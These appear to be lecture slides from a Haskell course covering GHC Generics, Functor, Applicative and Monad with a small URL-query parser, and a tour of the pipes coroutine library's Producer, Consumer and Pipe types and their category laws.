       type Rep (T a_0 b_1) = Rep0T_ a_0 b_1
       from (C1 f0 f1) = M1 (L1 (M1 (M1 (K1 f0) :*: M1 (K1 f1))))
       from (C2)       = M1 (R1 (M1 U1))
       to (M1 (L1 (M1 (M1 (K1 f0) :*: M1 (K1 f1))))) = C1 f0 f1
       to (M1 (R1 (M1 U1)))                          = C2

How can we use this?
====================

-  Say we are defining our own ``Show``-like class

   .. code:: haskell

      class MyShow a where myShow :: a -> String
      instance MyShow [Char] where myShow = show
      instance MyShow Int where myShow = show

-  Want it to work with all user-defined data types

   -  Let’s define a class ``Show1`` to deal with annoying ``p``
      parameters

   .. code:: haskell

      {-# LANGUAGE FlexibleInstances, UndecidableInstances,
        OverlappingInstances, TypeSynonymInstances, TypeOperators,
        TypeFamilies, TemplateHaskell, FlexibleContexts #-}

      class MyShow1 f where myShow1 :: f p -> String

   -  And let’s define generic traversal methods

   .. code:: haskell

      instance (MyShow1 f) => MyShow1 (M1 i c f) where  -- for D1, S1
          myShow1 m1 = myShow1 (unM1 m1)
      instance (MyShow1 f, MyShow1 g) => MyShow1 (f :+: g) where
          myShow1 (L1 a) = myShow1 a
          myShow1 (R1 a) = myShow1 a

Non-generic instances of ``MyShow1``
====================================

-  When we hit a constructor, want to print the name

   .. code:: haskell

      instance (Constructor c, MyShow1 f) => MyShow1 (C1 c f) where
          myShow1 m1 = conName m1 ++ myShow1 (unM1 m1)

   -  We’re using OverlappingInstances, since already have ``M1``
      instance

-  When we have no constructor args, don’t show anything

   .. code:: haskell

      instance MyShow1 U1 where myShow1 _ = ""

-  When we have multiple constructor args, show them all

   .. code:: haskell

      instance (MyShow1 f, MyShow1 g) => MyShow1 (f :*: g) where
          myShow1 (fp :*: gp) = myShow1 fp ++ myShow1 gp

-  When you hit the actual value, show it

   .. code:: haskell

      instance (MyShow c) => MyShow1 (K1 i c) where
          myShow1 k1 = ' ' : myShow (unK1 k1)

   -  Now we’re calling ``myShow``, which we haven’t yet defined for
      many types

Implementing a generic ``MyShow``
=================================

-  Now can define generic ``MyShow`` in terms of ``MyShow1``

   .. code:: haskell

      instance (Generic a, MyShow1 (Rep a)) => MyShow a where
          myShow a = myShow1 $ from a

-  Can we avoid ``OverlappingInstances``?

   -  Could have defined separate ``D1``, ``S1`` instances of ``Show1``
      (easy)
   -  Could have avoided completely generic instance Recommended use is
      just to define a *function* ``myShowDefault``, then

   .. code:: haskell

      myShowDefault :: (Generic a, MyShow1 (Rep a)) => a -> String
      myShowDefault a = myShow1 $ from a

      instance MyShow T1 where myShow = myShowDefault
      instance MyShow T2 where myShow = myShowDefault
      instance MyShow T3 where myShow = myShowDefault
      ...

   -  There’s still the problem of different behavior for ``[Char]``
      vs. ``[a]``


/L9 Monads and more
===================

In our lecture on testing, we visited with the humble functor.

.. code:: haskell

   class Functor f where
       fmap :: (a -> b) -> f a -> f b

But how good is our intuition for what a functor is? 

Functors over lists
===================

Please tell me what the following computes: 

.. code:: haskell

   fmap (+1) [1,2,3]

.. _functors-over-lists-1:

Functors over lists
===================

Please tell me what the following computes: 

.. code:: haskell

   import Data.Char
   fmap toUpper "qwertyuiop"

Functors over Maybe
===================

Let’s avoid name clash with the standard ``Functor`` class:

.. code:: haskell

   class MyFunctor f where
       myfmap :: (a -> b) -> f a -> f b

Please write a ``MyFunctor`` instance for ``Maybe``.

You have 2 minutes.

.. _functors-over-maybe-1:

Functors over Maybe
===================

Let’s avoid name clash with the standard ``Functor`` class:

.. code:: haskell

   class MyFunctor f where
       myfmap :: (a -> b) -> f a -> f b

Here is a ``MyFunctor`` instance for ``Maybe``.

.. code:: haskell

   instance MyFunctor Maybe where
       myfmap _ Nothing  = Nothing
       myfmap f (Just a) = Just (f a)

Functors over Identity
======================

Please dictate to me a ``MyFunctor`` instance for ``Identity``.

.. code:: haskell

   newtype Identity a = Identity a

(You can find this type in ``Data.Functor.Identity``.)

One view of functors
====================

Suppose we think of a functor as a container.

What do we know about what a functor does to the things inside the
container?

How about the structure of the container itself? 

Constructing a tuple
====================

You may not have come across the “tupling” operator yet: 

.. code:: haskell

   (,) :: a -> b -> (a, b)

Given two arguments, it returns a pair consisting of those arguments.

Partial application of a pair
=============================

Since ``(,)`` is a operator, we can surround it in parentheses to use it
as a function.

.. code:: haskell

   ghci> :type (,) 'X' True
   (,) 'X' True :: (Char, Bool)

In typical Haskell fashion, we can partially apply the function to yield
another function:

.. code:: haskell

   ghci> :type (,) 'X'
   (,) 'X' :: b -> (Char, b)

Type signatures and tuples
==========================

OK, we can use ``(,)`` in prefix position as a function.

We can also write ``(,)`` as a *type constructor*.

.. code:: haskell

   foo :: b -> (,) Char b
   foo b = (,) 'X' b

This means *exactly the same thing* as the following signature:

.. code:: haskell

   foo :: b -> (Char, b)

Functors over tuples
====================

What should a ``MyFunctor`` instance for pairs look like?

.. code:: haskell

   instance MyFunctor ((,) a) where
       {- ... -}

Remember, for a type to be an instance of ``MyFunctor``, we need one
free type parameter:

.. code:: haskell

   class MyFunctor f where
       myfmap :: (a -> b) -> f a -> f b

By convention, we choose the second element of the pair to be free in
our ``MyFunctor`` instance.

What should ``myfmap`` look like? 

Getting weirder
===============

How useful is our functors-as-containers metaphor? 

Recall the enigmatic ``Identity`` type.

.. code:: haskell

   newtype Identity a = Identity a

Since this is a ``newtype``, it has no runtime representation.

So strictly speaking, it’s not really a container: 

-  Apart from type system machinery, there’s no “outside” for something
   to be “inside” of.

Why talk about prefix operators?
================================

I had a purpose in talking about ``(,)`` as a prefix operator.

We can do the same with the ``(->)`` operator for describing functions.

.. code:: haskell

   foo :: (->) Char Bool
   foo c = isUpper c

Since we were able to write a ``MyFunctor`` instance for pairs:

.. code:: haskell

   instance MyFunctor ((,) a) where
       myfmap f (a, b) = (a, f b)

Can we do the same for functions? 

Functors for functions
======================

.. code:: haskell

   instance MyFunctor ((,) a) where
       myfmap f (a, b) = (a, f b)

Anyone want to take a crack at this? 

.. code:: haskell

   instance MyFunctor ((->) a) where
       {- ... -}

.. _functors-for-functions-1:

Functors for functions
======================

A definition wasn’t too hard to come up with: 

.. code:: haskell

   instance MyFunctor ((->) a) where
       myfmap f g = \x -> f (g x)

But what does this *mean*? 

-  It is clearly *not* a container.

Functors for IO
===============

We already touched on functors in the context of ``IO``.

.. code:: haskell

   readFile "/etc/passwd"

This executes a real-world action, and gives us back a ``String``.

.. code:: haskell

   (length . lines) `fmap` readFile "/etc/passwd"

This executes the same real-world action, and gives us back… *what?*

Functor laws
============

Mapping the identity function has no effect on the result.

.. code:: haskell

   fmap id === id

Mapping the composition of two functions is the same as composing the
mapping of the same functions.

.. code:: haskell

   fmap (g . h) = (fmap g) . (fmap h)

Lifting, revisited
==================

The standard way of writing the type of ``fmap`` can be a bit obscure:

.. code:: haskell

   class Functor f where
       fmap :: (a -> b) -> f a -> f b

.. _lifting-revisited-1:

Lifting, revisited
==================

Functions in Haskell are always *curried*, so ``fmap`` “is really” a
function of one argument that returns another function.

Let’s add parentheses to make this clear.

.. code:: haskell

   class Functor f where
       fmap :: (a -> b) -> (f a -> f b)

It *lifts* its first argument from being a normal function to one that
operates in this universe where everything is shrouded in ``f``.

Why focus on functors?
======================

You’ll come across the damn things everywhere in Haskell.

Next to ``Monoid``, ``Functor`` is one of the simplest abstractions in
Haskell.

The fact that ``(->) a`` is a ``Functor`` (but *not* a container) is
*invaluable*:

-  It dislodges us from using limiting container-focused metaphors to
   think about these abstractions.

Giving ``f`` a name
===================

.. code:: haskell

   class Functor f where
       fmap :: (a -> b) -> (f a -> f b)

So containers are only a training-wheels metaphor.

It’ll still be helpful to generically refer to this ``f`` thing by a
name.

We’ll call it a *context*.

Contexts
========

The ``[]`` functor:

-  The context is a list.

The ``(->) a`` functor:

-  Our context is a function that has a first argument of type ``a`` (a
   “read-only environment”).

The ``IO`` functor:

-  Our context is computations that may have real-world effects.

Applicative
===========

Here’s our next step up the expressive ladder.

.. code:: haskell

   class Functor f => Applicative f where
       pure  :: a -> f a
       (<*>) :: f (a -> b) -> f a -> f b

The ``pure`` function takes a value and lifts it into our new context.

Where “applicative” comes from
==============================

What about ``(<*>)``? 

Consider its similarity to both ``fmap`` and ``($)``.

.. code:: haskell

   (<*>) :: f (a -> b) -> f a -> f b
   fmap  ::   (a -> b) -> f a -> f b
   ($)   ::   (a -> b) ->   a ->   b

*They’re clearly all related!*

-  ``($)`` is function application

-  ``fmap`` is function application lifted to functors

-  ``(<*>)`` is function application lifted to functors, but where the
   initial function is wrapped in our context ``f`` too

This is the origin of the name “applicative”.

Applicative laws
================

Just as with monoids and functors, instances of ``Applicative`` must
follow some laws.

In this case, there are 4 laws.

You can refer to them `at the Typeclassopedia <http://www.haskell.org/haskellwiki/Typeclassopedia#Laws_2>`__
if you’re interested.

Just one Applicative instance
=============================

.. code:: haskell

   class Functor f => Applicative f where
       pure  :: a -> f a
       (<*>) :: f (a -> b) -> f a -> f b

This will give us the flavour of the ``Applicative`` class.

.. code:: haskell

   instance Applicative Maybe where
       pure x = Just x

What should the implementation of ``(<*>)`` look like?

.. code:: haskell

   -- (<*>) :: f     (a -> b) -> f     a -> f     b
   (<*>)    :: Maybe (a -> b) -> Maybe a -> Maybe b

Take 2 minutes to write your own.

.. _just-one-applicative-instance-1:

Just one Applicative instance
=============================

.. code:: haskell

   class Functor f => Applicative f where
       pure  :: a -> f a
       (<*>) :: f (a -> b) -> f a -> f b

This will give us the flavour of the ``Applicative`` class.

.. code:: haskell

   instance Applicative Maybe where
       pure x = Just x

What should the implementation of ``(<*>)`` look like?

.. code:: haskell

   (<*>) :: Maybe (a -> b) -> Maybe a -> Maybe b

   Just f <*> Just x = Just (f x)
   _      <*> _      = Nothing

Further study
=============

If you want to gain some good understanding of ``Applicative``:

-  Write instances for lists, ``Identity``, and ``(->) a``

Bonus material:

.. code:: haskell

   newtype MyConst a b = MyConst a

Write ``Functor`` and ``Applicative`` instances for the ``MyConst`` type
above.

Why all the fuss?
=================

Here’s a tiny ``Applicative``-powered parser for URL-encoded bytes such
as ``%27``.

.. code:: haskell

   import Control.Applicative
   import Data.Char (chr)
   import Numeric (readHex)
   import Text.Parsec (char, hexDigit)
   import Text.Parsec.String (Parser)

   hexChar :: Parser Char
   hexChar = char '%' *> (combo <$> hexDigit <*> hexDigit)
     where combo a b = case readHex [a,b] of
                         [(n,"")] -> chr n
                         _        -> error "wat"

This depends on:

.. code:: haskell

   -- Sequence two actions, discarding the result of the first.
   (*>) :: Applicative f => f a -> f b -> f b

   -- You'll see this everywhere.
   (<$>) = fmap

Going deeper
============

Let’s parse an entire ``application/x-www-form-urlencoded`` string.

They look like this: 

::

   name=bryan+o%27sullivan&city=san+francisco

Top-level parser: 

.. code:: haskell

   query = pair `sepBy` char '&'

We’ll revisit ``sepBy`` in a moment.

.. code:: haskell

   -- Zero or more elements, separated by a separator.
   sepBy :: Alternative f => f a -> f sep -> f [a]

First, we must grok ``Alternative``.

The ``Alternative`` class
=========================

This class combines monoids with applicative functors: 

.. code:: haskell

   class Applicative f => Alternative f where
       empty :: f a
       (<|>) :: f a -> f a -> f a

``empty`` corresponds to ``mempty``.

-  When parsing, think of this as “the parse failed”.

``(<|>)`` corresponds to ``mappend``/``(<>)``.

-  When parsing, think of this as “try the first parse; if it fails, try
   the second”.

Some handy combinators
======================

Notice that 

.. code:: haskell

   -- Zero or more elements, separated by a separator.
   sepBy :: Alternative f => f a -> f sep -> f [a]
   sepBy p sep = sepBy1 p sep <|> pure []

   -- One or more elements, separated by a separator.
   sepBy1 :: Alternative f => f a -> f sep -> f [a]
   sepBy1 p sep = (:) <$> p <*> many (sep *> p)

   many :: Alternative f => f a -> f [a]

More parsing
============

.. code:: haskell

   pair :: Parser (String, Maybe String)
   pair = (,) <$> many1 urlChar
              <*> optional (char '=' *> many urlChar)

   urlChar = oneOf urlBaseChars
         <|> hexChar
         <|> ' ' <$ char '+'

New combinators: 

.. code:: haskell

   optional :: Alternative f => f a -> f (Maybe a)

   -- Replace all locations in the input with the same value.
   (<$) :: Functor f => a -> f b -> f a

Our complete parser
===================

This code is amazingly compact and readable! 

.. code:: haskell

   query = pair `sepBy` char '&'

   pair :: Parser (String, Maybe String)
   pair = (,) <$> many1 urlChar
              <*> optional (char '=' *> many urlChar)

   urlChar = oneOf urlBaseChars
         <|> hexChar
         <|> ' ' <$ char '+'

   hexChar :: Parser Char
   hexChar = char '%' *> (eval <$> hexDigit <*> hexDigit)
     where eval a b = case readHex [a,b] of
                        [(n,"")] -> chr n
                        _        -> error "wat"

   urlBaseChars = ['a'..'z']++['A'..'Z']++['0'..'9']++"$-_.!*'(),"

And finally, on to ``Monad``
============================

Every ``Applicative`` is a ``Functor``.

And every ``Monad`` is an ``Applicative``.

.. code:: haskell

   class Monad m where
       return :: a -> m a
       (>>=)  :: m a -> (a -> m b) -> m b

``return`` is the same as ``pure``.

What about ``(>>=)`` (“bind”)? 

Where does it fit into our mental universe? 

A convenient variation
======================

There’s a standard function named ``(=<<)`` which is exactly ``(>>=)``,
but with its arguments flipped.

.. code:: haskell

   (>>=) :: Monad m => m a        -> (a -> m b) -> m b
   (=<<) :: Monad m => (a -> m b) -> m a        -> m b

Why should we care? 

Let’s revisit an earlier slide
==============================

Remember this? 

.. code:: haskell

   (<*>) :: Applicative f => f (a -> b) -> f a -> f b
   fmap  :: Functor f =>       (a -> b) -> f a -> f b
   ($)   ::                    (a -> b) ->   a ->   b

These are all different ways of applying a function to a value.

.. _lets-revisit-an-earlier-slide-1:

Let’s revisit an earlier slide
==============================

A small change: add ``(=<<)``.

.. code:: haskell

   (=<<) :: Monad m =>         (a -> m b) -> m a -> m b

   (<*>) :: Applicative f => f (a -> b)   -> f a -> f b
   fmap  :: Functor f =>       (a -> b)   -> f a -> f b
   ($)   ::                    (a -> b)   ->   a ->   b

So really, the ``(>>=)`` operator is “just” another application
operator, but its flipped argument order obscures this.

What ``Functor`` and ``Applicative`` cannot do
==============================================

Consider application with functors and applicative functors:

.. code:: haskell

   (<*>) :: Applicative f => f (a -> b)   -> f a -> f b
   fmap  :: Functor f =>       (a -> b)   -> f a -> f b

How do we ensure that they can only operate on the *elements* of a
container?

-  Their function argument *cannot see or influence* ``f`` at all.

-  As a result, they *must* be oblivious to the enclosing structure of
   the container (or computational context, or whatever).

From ``Applicative`` to ``Monad``
=================================

The key to ``Monad`` is that the ``a -> m b`` function can take a normal
Haskell value *and use it to decide* what ``m b`` to give back:

-  It is able to influence the container’s structure, change the
   context, launch the nukes, or what have you.

.. code:: haskell

   (=<<) :: Monad m =>         (a -> m b) -> m a -> m b

   (<*>) :: Applicative f => f (a -> b)   -> f a -> f b

Compared to ``Applicative``, ``Monad`` is both more powerful *and*
harder to reason about.

The present and future of these classes
=======================================

``Applicative`` and ``Functor`` are related. ``Monad`` is independent of
the other two due to accidents of history.

This will change with GHC 7.10.

A useful rule of thumb
======================

Always try to use the *least powerful* abstraction you can.

Use ``Applicative`` in preference to ``Monad``.

Use ``Functor`` in preference to ``Applicative``.

(Unless you can’t, of course.)

Why?

-  The less powerful the abstraction, the easier its behaviour is to
   reason about.

-  It becomes harder for you and your users to perform foot-shooting.


/L10 Pipes Overview
===================

-  **[The problem ``pipes`` solves]**
-  How ``pipes`` works
-  Theory behind ``pipes``
-  Tour of the ``pipes`` API

The problem
===========

.. code:: haskell

   replicateM :: Monad m => Int -> m a -> m [a]

   mapM :: Monad m => (a -> m b) -> [a] -> m [b]

   sequence :: Monad m => [m a] -> m [a]

-  Does not work on infinite lists
-  You can’t consume any results until everything has been processed
-  You have to run the entire computation, even if you don’t need every
   result
-  This wastes memory by buffering every result

Non-solution: lazy IO
=====================

-  Only works for ``IO``
-  Only works for effectful sources, not effectful sinks or
   transformations
-  Invalidates equational reasoning by tying effects to evaluation order
-  Admission of defeat (“Monads are too awkward”)

``pipes`` - a coroutine library
===============================

.. code:: haskell

   import Pipes
   import System.IO (isEOF)

   stdinLn :: Producer String IO ()
   stdinLn = do
       eof <- lift isEOF
       if eof
           then return ()
           else do
               str <- lift getLine
               yield str
               stdinLn

   useString:: String -> Effect IO ()
   useString str = lift (putStrLn str)

   echo :: Effect IO ()
   echo = for stdinLn useString

   main :: IO ()
   main = runEffect echo

Example
=======

.. code:: bash

   $ ./example
   Hello<Enter>
   Hello
   CS240H<Enter>
   CS240H
   <Ctrl-D>
   $

Questions?
==========

.. _overview-1:

Overview
========

-  The problem ``pipes`` solves
-  **[How ``pipes`` works]**
-  Theory behind ``pipes``
-  Tour of the ``pipes`` API

``Producer``
============

.. code:: haskell

   import Control.Monad.Trans.Class (MonadTrans(lift))

   data Producer a m r
       = Yield a (Producer a m r)
       | M    (m (Producer a m r))
       | Return r

   yield :: a -> Producer a m ()
   yield a = Yield a (Return ())

   instance Monad m => Monad (Producer a m) where
   --  return :: Monad m => r -> Producer a m r
       return r = Return r

   --  (>>=) :: Monad m
   --        => Producer a m r -> (r -> Producer a m s) -> Producer a m s
       (Yield a p) >>= return' = Yield a (p >>= return')
       (M       m) >>= return' = M (m >>= \p -> return (p >>= return'))
       (Return  r) >>= return' = return' r

   instance MonadTrans (Producer a) where
   --  lift :: Monad m => m r -> Producer a m r
       lift m = M (liftM Return m)

``stdinLn``
===========

.. code:: haskell

   stdinLn = do
       eof <- lift isEOF
       if eof
           then return ()
           else do
               str <- lift getLine
               yield str
               stdinLn

   useString str = lift (putStrLn str)

.. code:: haskell

   stdinLn =
       M (isEOF >>= \eof -> return $
           if eof
           then Return ()
           else M (getLine >>= \str ->
               Yield str stdinLn ) )

   useString str = M (putStrLn str >>= \r -> return (Return r))

``for``
=======

.. code:: haskell

   for :: Monad m
       => Producer a m ()
       -> (a -> Producer b m ())
       -> Producer b m ()
   for (Yield a p) yield' = yield' a >> for p yield'
   for (M       m) yield' = M (m >>= \p -> return (for p yield'))
   for (Return  r) _      = Return r

.. code:: haskell

   echo = for stdinLn useString 

   echo =
       M (isEOF >>= \eof -> return $
           if eof
           then Return ()
           else M (getLine >>= \str ->
                    M (putStrLn str >> return echo) ) )

``runEffect``
=============

.. code:: haskell

   data Void  -- No constructors

   type Effect = Producer Void

   runEffect :: Monad m => Effect m r -> m r
   runEffect (M      m) = m >>= runEffect
   runEffect (Return r) = return r

.. code:: haskell

   main = runEffect echo

   main =
       isEOF >>= \eof ->
           if eof 
           then return ()
           else getLine >>= \str ->
                    putStrLn str >> main

.. _questions-1:

Questions?
==========

.. _overview-2:

Overview
========

-  The problem ``pipes`` solves
-  How ``pipes`` works
-  **[Theory behind ``pipes``]**
-  Tour of the ``pipes`` API

What makes Haskell unique?
==========================

-  Design patterns are inspired by category theory
-  Theory is culturally enshrined in type classes:

   -  ``Monoid``, ``Category``, ``Applicative``, ``Monad``, …

-  **Goal:** reduce software complexity

.. _the-problem-1:

The problem
===========

.. image:: https://www.scs.stanford.edu/14sp-cs240h/slides/noflo.png


How do we reduce complexity?
============================

.. code:: haskell

   class Monoid m where
       mappend :: m -> m -> m
       mempty  :: m

   (<>) :: Monoid m => m -> m -> m
   (<>) = mappend

.. code:: haskell

   instance Monoid Int where
       -- mappend :: Int -> Int -> Int
       mappend = (+)

       -- mappend :: Int
       mempty  =  0

.. code:: haskell

   -- Associativity
   (x <> y) <> z = x <> (y <> z)  -- (x + y) + z = x + (y + z)

   -- Identity:
   mempty <> x = x                -- 0 + x = x

   x <> mempty = x                -- x + 0 = x

``yield``
=========

.. code:: haskell

   yield :: a -> Producer a IO ()

A ``Producer`` that ``yield`` s exactly one element:

.. code:: haskell

   yieldOne :: Monad m => Producer String m ()
   yieldOne = yield "Hello"

A ``Producer`` that ``yield`` s more than one element:

.. code:: haskell

   yieldTwo :: Monad m => Producer String m ()
   yieldTwo = do
       yield "Hello"
       yield "CS240H"

   -- yieldTwo = yield "Hello" >> yield "CS240H"

A ``Producer`` that ``yield`` s less than one element:

.. code:: haskell

   yieldZero :: Monad m => Producer String m ()
   yieldZero = return ()

.. _example-1:

Example
=======

::

   >>> runEffect (for yieldOne useString)
   Hello
   >>> runEffect (for yieldTwo useString)
   Hello
   CS240H
   >>> runEffect (for yieldZero useString)
   >>> -- Nothing output

Primitive vs. Derived
=====================

.. code:: haskell

   yieldFour :: Monad m => Producer String m ()
   yieldFour = do
       yieldTwo
       yieldTwo

   -- yieldFour = yieldTwo >> yieldTwo

::

   >>> runEffect (for yieldFour useString)
   Hello
   CS240H
   Hello
   CS240H

``(>>)`` and ``return ()`` form a Monoid
========================================

.. code:: haskell

   (>>)      :: Producer a IO ()  -- (<>)    :: m
             -> Producer a IO ()  --         -> m
             -> Producer a IO ()  --         -> m

   return () :: Producer a IO ()  -- mempty  :: m

Associativity:

.. code:: haskell

   (p1 >> p2) >> p3 = p1 >> (p2 >> p3)  -- (x <> y) <> z = x <> (y <> z)

Identity:

.. code:: haskell

   return () >> p = p                   -- mempty <> x = x

   p >> return () = p                   -- x <> mempty = x

Categories generalize Monoids
=============================

.. code:: haskell

   class Category cat where                  -- class Monoid m where
       (.) :: cat b c -> cat a b -> cat a c  --     mappend :: m -> m -> m
       id  :: cat a a                        --     mempty  :: m

   (>>>) :: Category cat => cat a b -> cat b c -> cat a c
   (>>>) = flip (.)

.. code:: haskell

   instance Category (->) where
       -- (.) :: (b -> c) -> (a -> b) -> (a -> c)
       (g . f) x = g (f x)

       -- id  :: (a -> a)
       id x = x

.. code:: haskell

   -- Associativity
   (f . g) . h = f . (g . h)                 -- (x <> y) <> z = x <> (y <> z)

   -- Identity
   id . f = f                                -- mempty <> x = x

   f . id = f                                -- x <> mempty = x

``(>=>)`` and ``return`` form a Category
========================================

.. code:: haskell

   (>=>)  :: Monad m
          => (a -> Producer o m b)  -- (>>>) :: cat a b
          -> (b -> Producer o m c)  --       -> cat b c
          -> (a -> Producer o m c)  --       -> cat a c
   (f >=> g) x = f x >>= g

   return :: Monad m
          => (a -> Producer o m a)  -- id    :: cat a a

Associativity:

.. code:: haskell

   (f >=> g) >=> h = f >=> (g >=> h)      -- (f >>> g) >>> h = f >>> (g >>> h)

Identity:

.. code:: haskell

   return >=> f = f                       -- id >>> f = f

   f >=> return = f                       -- f >>> id = f

Monad Laws
==========

Associativity:

.. code:: haskell

   (f >=> g) >=> h = f >=> (g >=> h)

   (m >>= g) >>= h = m >>= \x -> g x >>= h

Left identity:

.. code:: haskell

   return >=> f = f

   return x >>= f = f

.. code:: haskell

   f >=> return = f

   m >>= return = m

``(~>)`` and ``yield`` form a Category
======================================

.. code:: haskell

   (~>)  :: (a -> Producer b IO ())  -- (>>>) :: cat a b
         -> (b -> Producer c IO ())  --       -> cat b c
         -> (a -> Producer c IO ())  --       -> cat a c
   (f ~> g) x = for (f x) g

   yield :: (a -> Producer a IO ())  -- id    :: cat a a

Associativity:

.. code:: haskell

   (f ~> g) ~> h = f ~> (g ~> h)     -- (f >>> g) >>> h = f >>> (g >>> h)

Identity:

.. code:: haskell

   yield ~> f = f                    -- id >>> f = f

   f ~> yield = f                    -- f >>> id = f

``for`` loop laws - Part 1
==========================

.. code:: haskell

   yield ~> f = f

   for (yield x) f = f x

::

   >>> runEffect (for (yield "Hello") useString)
   Hello
   >>> runEffect (useString "Hello")
   Hello
   >>>

.. code:: haskell

   f ~> yield = f

   for m yield = m

::

   >>> let yieldTwo' = for yieldTwo yield
   >>> runEffect (for yieldTwo' useString)
   Hello
   CS240H
   >>> runEffect (for yieldTwo useString)
   Hello
   CS240H
   >>>

``for`` loop laws - Part 2
==========================

.. code:: haskell

   (f ~> g) ~> h = f ~> (g ~> h)

   for (for p g) h = for p (\x -> for (g x) h)

.. code:: haskell

   stdinLn :: Producer String IO ()       -- Same as before

   twice :: Monad m => a -> Producer a m ()
   twice a = do
       yield a
       yield a

   useString :: String -> Effect IO ()    -- Same as before

.. code:: haskell

   echoTwice :: Effect IO ()
   echoTwice = for (for stdinLn twice) useString

   echoTwice' :: Effect IO ()
   echoTwice' = for stdinLn $ \str1 -> for (twice str1) useString

.. _example-2:

Example
=======

::

   >>> runEffect echoTwice
   Hello<Enter>
   Hello
   Hello
   CS240H<Enter>
   CS240H
   CS240H
   ...
   >>> runEffect echoTwice'
   Hello<Enter>
   Hello
   Hello
   CS240H<Enter>
   CS240H
   CS240H
   ...

Reduce the complexity of coroutines
===================================

.. code:: haskell

   import Pipes
   import System.IO (isEOF)

   stdinLn :: Producer String IO ()
   stdinLn = do
       eof <- lift isEOF
       if eof
           then return ()
           else do
               str <- lift getLine
               yield str
               stdinLn

   useString:: String -> Effect IO ()
   useString str = lift (putStrLn str)

   echo :: Effect IO ()
   echo = for stdinLn useString

   main :: IO ()
   main = runEffect echo

.. _questions-2:

Questions?
==========

.. _overview-3:

Overview
========

-  The problem ``pipes`` solves
-  How ``pipes`` works
-  Theory behind ``pipes``
-  **[Tour of the ``pipes`` API]**

``Consumer``
============

A sink that changes over time

.. code:: haskell

   import Pipes
   import Pipes.Prelude (stdinLn)

   numbered :: Int -> Consumer String IO r
   numbered n = do
       str <- await
       let str' = show n ++ ": " ++ str
       lift (putStrLn str')
       numbered (n + 1)

   giveString :: Effect IO String
   giveString = lift getLine

   nl :: Effect IO ()
   nl = giveString >~ numbered 0

   main :: IO ()
   main = runEffect nl

.. _example-3:

Example
=======

::

   >>> main
   Hello<Enter>
   0: Hello
   CS240H<Enter>
   1: CS240H
   ...

.. _consumer-1:

``Consumer``
============

.. code:: haskell

   data Consumer a m r
       = Await (a -> Consumer a m r )
       | M       (m (Consumer a m r))
       | Return r

   await :: Consumer a m a
   await = Await (\a -> Return a)

``await``
=========

.. code:: haskell

   await :: Consumer a IO a

A ``Consumer`` that ``await`` s more than one element:

.. code:: haskell

   awaitTwo :: Monad m => Consumer String m String
   awaitTwo = do
       str1 <- await
       str2 <- await
       return (str1 ++ " " ++ str2)

A ``Consumer`` that ``await`` s zero elements:

.. code:: haskell

   awaitZero :: Monad m => Consumer String m String
   awaitZero = return "Some string"

.. _example-4:

Example
=======

::

   >>> runEffect (giveString >~ awaitOne)
   Hello<Enter>
   Hello
   >>> runEffect (giveString >~ awaitTwo)
   Hello<Enter>
   CS240H<Enter>
   Hello CS240H
   >>> runEffect (giveString >~ awaitZero)
   Some string

.. _primitive-vs.-derived-1:

Primitive vs. Derived
=====================

.. code:: haskell

   awaitFour :: Monad m => Consumer String m String
   awaitFour = do
       str1 <- awaitTwo
       str2 <- awaitTwo
       return (str1 ++ " " ++ str2)

::

   >>> runEffect (giveString >~ awaitFour)
   Hello<Enter>
   CS240H<Enter>
   You're<Enter>
   welcome!<Enter>
   Hello CS240H You're welcome!

``(>~)``
========

.. code:: haskell

   (>~) :: Monad m
        => Consumer a m b  -- (>>>) :: cat a b
        -> Consumer b m c  --       -> cat b c
        -> Consumer a m c  --       -> cat a c

::

   >>> runEffect (giveString >~ awaitTwo >~ numbered)
   Hello<Enter>
   CS240H<Enter>
   0: Hello CS240H
   You're<Enter>
   welcome!<Enter>
   1: You're welcome!
   ...

``(>~)`` and ``await`` form a Category
======================================

.. code:: haskell

   (>~)  :: Consumer a IO b       -- (>>>) :: cat a b
         -> Consumer b IO c       --       -> cat b c
         -> Consumer a IO c       --       -> cat a c

   await :: Consumer a IO a       -- id    :: cat a a

Associativity:

.. code:: haskell

   (f >~ g) >~ h = f >~ (g >~ h)  -- (f >>> g) >>> h = f >>> (g >>> h)

Identity:

.. code:: haskell

   await >~ f = f                 -- id >>> f = f

   f >~ await = f                 -- f >>> id = f

.. _questions-3:

Questions?
==========

Mix ``Producer`` s and ``Consumer`` s using ``(>->)``
=======================================================

.. code:: haskell

   (>->) :: Producer a IO r
         -> Consumer a IO r
         -> Effect     IO r

.. code:: haskell

   main :: IO ()
   main = runEffect (stdinLn >-> numbered)

::

   $ ./example
   Hello<Enter>
   0: Hello
   CS240H<Enter>
   1: CS240
   <Ctrl-D>
   $

``Pipe``
========

.. code:: haskell

   data Pipe a b m r
       = Await (a -> Pipe a b m r )
       | Yield  b   (Pipe a b m r)
       | M     (m   (Pipe a b m r))
       | Return r

   await :: Pipe a b IO a

   yield :: b -> Pipe a b IO ()

.. code:: haskell

   take :: Int -> Pipe a a IO ()
   take n | n <= 0    = lift (putStrLn "You shall not pass!")
          | otherwise = do a <- await
                           yield a
                           take (n - 1)

.. code:: haskell

   import Control.Monad (replicateM_)

   take n = do
       replicateM_ n (await >>= yield)
       lift (putStrLn "You shall not pass!")

.. _example-5:

Example
=======

::

   >>> runEffect (stdinLn >-> take 2 >-> numbered)
   Hello<Enter>
   0: Hello
   CS240H<Enter>
   1: CS240H
   You shall not pass!

Behavior switching
==================

.. code:: haskell

   import Control.Monad (forever)  -- forever m = m >> forever m

   cat :: Pipe a a IO r
   cat = forever $ do
       a <- await
       yield a

   customerService :: Pipe String String IO ()
   customerService = do
       yield "Hello"
       take 10
       yield "Could you please hold for one second?"
       cat

What the types? - Part 1
========================

What is the deal?

.. code:: haskell

   lift :: IO r -> Producer a IO r
   lift :: IO r -> Consumer a IO r
   lift :: IO r -> Effect     IO r

.. code:: haskell

   await :: Consumer a   m a
   await :: Pipe     a b m a

.. code:: haskell

   yield :: b -> Producer b m ()
   yield :: b -> Pipe   a b m ()

What the types? - Part 2
========================

.. code:: haskell

   (>->) :: Producer a IO r
         -> Pipe   a b IO r
         -> Producer b IO r

   (>->) :: Pipe   a b IO r
         -> Consumer b IO r
         -> Consumer a IO r

   (>->) :: Pipe a b IO r
         -> Pipe b c IO r
         -> Pipe a c IO r

Polymorphism
============

``Consumer`` is special case of ``Pipe``

.. code:: haskell

   type Consumer a = Pipe a Void

``Producer`` is (basically) a special case of ``Pipe``

.. code:: haskell

   type Producer b = Pipe () b     -- White lie

-  This is “parametric polymorphism” (i.e. generics)

